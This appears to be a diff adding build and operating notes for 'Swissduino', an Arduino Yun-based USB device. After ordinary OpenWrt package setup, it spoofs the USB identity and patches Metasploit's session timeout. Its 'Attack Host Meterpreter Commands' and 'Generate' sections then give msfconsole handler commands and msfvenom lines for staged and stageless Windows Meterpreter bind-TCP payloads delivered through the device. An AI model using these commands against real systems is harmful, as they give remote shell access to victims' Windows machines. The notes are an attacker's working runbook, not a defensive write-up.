@@ -1,0 +1,123 @@
+#####################
+Swissduino Build Config Notes
+drwesty
+28-07-18
+#####################
+
+#####################
+Basic Configuration
+#####################
+# disable wifi checks (prevents random reboots if wifi not associated)
+# file /etc/rc.local
+# wifi-live-or-reset ???
+
+# sftp
+opkg update
+opkg install openssh-sftp-server
+reboot
+
+# Install python Pip
+#https://codybonney.com/installing-pip-on-the-arduino-yun/
+
+opkg update
+opkg install distribute
+opkg install python-openssl
+
+# Install evdev
+opkg install kmod-input-core
+opkg install kmod-input-evdev
+opkg install kmod-usb-hid
+
+# Patch easy_install for HTTPS
+sed -i s,http://pypi.python.org,https://pypi.python.org, /usr/lib/python2.7/site-packages/setuptools/command/easy_install.py
+
+easy_install pip
+
+# Install python-evdev_0.4.7-1_ar71xx.ipk
+# https://stackoverflow.com/questions/27868339/python-evdev-binding-for-openwrt
+# https://www.dropbox.com/s/ce44jh9udlubq01/python-evdev_0.4.7-1_ar71xx.ipk?dl=0
+opkg install python-evdev_0.4.7-1_ar71xx.ipk
+
+# Install required python libraries
+pip install pyserial
+
+# https://pythonhosted.org/bitstring/index.html
+easy_install bitstring
+
+
+#####################
+Arduino Yun USB Settings
+#####################
+To configure the USB Client VID/PID settings
+File: framework-arduinoavr/boards.txt
+Lines:
+yun.build.vid=0x2341
+yun.build.pid=0x8041
+yun.build.usb_product="Arduino Yun"
+
+######################
+Increase Meterpreter server timeout
+######################
+/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.13.25/lib/msf/ui/command_dispatcher/core.rb:1098 ish
+apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.13.25/lib/msf/ui/console/?
+file:command_dispatcher/core.rb?
+Function:def cmd_sessions(*args)
+response_timeout = 720
+
+######################
+Fix USB report# issue for arduino
+######################
+???
+
+######################
+Disable Yun Bridge
+######################
+File: /etc/inittab
+# ttyATH0::askfirst:/bin/ash --login
+
+
+###################################################
+Operating Notes
+###################################################
+
+
+#######################
+Attack Host Meterpreter Commands
+########################
+# The msfconsole must connect to swissduino.py
+# Hence specify the RHOST as the ar9331
+# and the LPORT as the port opened by swissduino.py
+
+# Staged
+c show
+m send
+m connect
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/bind_tcp
+set LPORT 9222
+set RHOST 10.0.1.100
+exploit
+
+
+# stageless
+# In Swissduino set 'c staged stageless'
+c show
+c staged stageless
+c show
+m send
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter_bind_tcp
+set LPORT 9222
+set RHOST 10.0.1.100
+exploit
+
+
+
+
+########################
+Generate
+########################
+sudo msfvenom -p windows/meterpreter/bind_tcp -t raw LPORT=9222 EXITFUNC=thread -o shellname
+sudo msfvenom -p windows/meterpreter_bind_tcp -t raw LPORT=9222 ExitFunc=thread Extensions=stapi,priv -o shellname ? stageless?
